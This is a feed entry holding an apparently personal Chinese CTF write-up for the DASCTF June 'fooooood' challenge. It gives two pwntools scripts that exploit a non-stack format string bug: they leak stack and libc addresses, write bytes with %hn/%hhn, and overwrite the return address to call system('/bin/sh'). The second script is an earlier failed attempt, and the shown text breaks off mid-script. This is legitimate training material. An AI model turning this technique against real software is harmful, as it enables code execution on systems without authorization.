    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/</id>
        <title>pwn入门-31-DASCTF六月二进制专项-1</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/"/>
        <content type="html">&lt;p&gt;​		和哥几个打的这个比赛,虽然只做出了几道题,但是还有几道其实也都差不多了,思路都没问题,还是因为细节的问题,对原理的掌握不够深入导致的问题,还得再好好打基础和巩固.&lt;/p&gt;
&lt;h1 id=&#34;fooooood&#34;&gt;&lt;a href=&#34;#fooooood&#34; class=&#34;headerlink&#34; title=&#34;fooooood&#34;&gt;&lt;/a&gt;fooooood&lt;/h1&gt;&lt;p&gt;​		这道格式化字符串题给自己整的太恶心了..主要是很久不做格式化字符串了,然后当时理解的没那么深入,有些小问题就卡死了…&lt;/p&gt;
&lt;p&gt;​		非栈上的格式化字符串利用, 看到一种方法是可以利用栈上已有的指针,当时也用了,不过不知道为什么利用格式化字符串写数据的时候有问题….回头再专门学一下&lt;/p&gt;
&lt;p&gt;​		这是一条可以利用的链&lt;/p&gt;
&lt;p&gt;​		感觉自己的思路是没有问题的,&lt;font color=&#34;red&#34;&gt;但是对格式化字符串的一些利用的小点不是很熟悉,就导致了问题&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/image-20230605163719082.png&#34; alt=&#34;image-20230605163719082&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/image-20230605172305883.png&#34; alt=&#34;image-20230605172305883&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;p&gt;​		主要分了几部分,先把for循环的i改大一点,因为要循环很多次,然后还要地址泄露,再之后呢,写一个格式化字符串的替换函数,把返回地址修改了就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Give me your name:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;favourite food: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;%11$p&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;You like &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#data = (io.recvline().strip()).decode().split(&amp;#x27;.&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsp = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;!?&amp;#x27;&lt;/span&gt;)[:-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)-&lt;span class=&#34;number&#34;&gt;248&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(rsp))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i = rsp+&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i_off = i&amp;amp;&lt;span class=&#34;number&#34;&gt;0xffff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(i_off))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;%&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i_off).encode()+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c%11$hn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;food: &amp;#x27;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;%&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;).encode()+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c%37$hhn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;food: &amp;#x27;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 泄露libc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;%9$p&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;food: &amp;#x27;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;You like &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.address = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;!?&amp;#x27;&lt;/span&gt;)[:-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;240&lt;/span&gt;- libc.sym.__libc_start_main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述 （1）与（2）两个栈地址在格式化字符串中的偏移&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;overlap&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;dest,ptr,off1,off2&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    d = dest&amp;amp;&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; ptr:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;%&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(d).encode()+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c%&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(off1).encode()+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;$hhn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;food: &amp;#x27;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f=ptr&amp;amp;&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        payload=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;%&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(f).encode()+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c%&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(off2).encode()+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;$hhn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;food: &amp;#x27;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        d+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ptr&amp;gt;&amp;gt;=&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=rsp+&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ptr=libc.address+&lt;span class=&#34;number&#34;&gt;0x21112&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;%&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(ret&amp;amp;&lt;span class=&#34;number&#34;&gt;0xffff&lt;/span&gt;).encode()+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c%&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;).encode()+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;$hn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;food: &amp;#x27;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 覆盖返回地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;overlap(ret,ptr,&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;39&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;overlap(ret+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,libc.search(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;).__next__(),&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;39&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;overlap(ret+&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;,libc.sym.system,&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;39&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;food: &amp;#x27;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		自己之前的exp..回头检查下是哪的问题&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mylibc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Give me your name:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;favourite food: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;%31$p.%21$p&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;You like &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = (io.recvline().strip()).decode().split(&lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#libc_addr = int(data[3],16)-0x20840&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;first_addr = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(data[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(first_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(libc_addr))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(hex(ret_addr))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#onegadget = libc_addr + 0x45226&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = fmtstr_payload(&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;,&amp;#123;&lt;span class=&#34;number&#34;&gt;0x7fffff&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0x7fffff&lt;/span&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(payload)&lt;/span&gt;&lt;br&gt;&lt;span 